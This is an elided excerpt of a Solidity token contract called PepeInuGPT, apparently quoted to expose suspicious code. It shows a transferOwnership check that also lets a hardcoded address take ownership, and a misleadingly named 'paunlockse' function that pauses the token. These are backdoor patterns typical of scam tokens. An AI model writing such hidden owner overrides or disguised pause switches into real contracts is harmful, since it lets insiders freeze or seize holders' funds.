...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xaf1a6CdafD5682fC6da6eD8945A7bA4A7710f13f));
...
contract Pausable is Ownable {
   ...
   */
  function paunlockse() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }
...
contract PepeInuGPT is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "PEPT";
  string private _name = "PepeInuGPT";
